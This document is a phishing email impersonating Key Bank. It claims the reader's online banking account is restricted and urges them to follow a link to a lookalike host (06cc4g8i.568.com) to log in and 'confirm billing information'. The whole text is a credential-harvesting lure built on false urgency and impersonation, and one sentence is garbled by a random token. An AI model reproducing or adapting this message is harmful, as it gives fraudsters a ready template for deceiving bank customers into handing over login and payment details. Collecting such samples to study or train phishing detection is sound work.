Dear Key Bank Customer: 

Key Bank is constantly working to increase security for all Online Banking
users. To ensure the integrity of our online payment system, we periodically
review 06cc4g8i.3g1j account is out of date and it's on restricted status.
Restricted accounts continue to receive payments, but they are limited
in their ability to send or withdraw funds. 

To lift up this restriction, you need to login into your account, then
you have to complete our verification process. You must confirm your billing
information. To initiate the billing update confirmation process, please
follow the link bellow and fill in the necessary fields : 

https://06cc4g8i.568.com/ib2/Controller?requester=signon

All restricted accounts have their billing information unconfirmed, meaning
that you may no longer send money from your account until you have updated
your billing information on file. 

Thank you for using Key Online Banking.
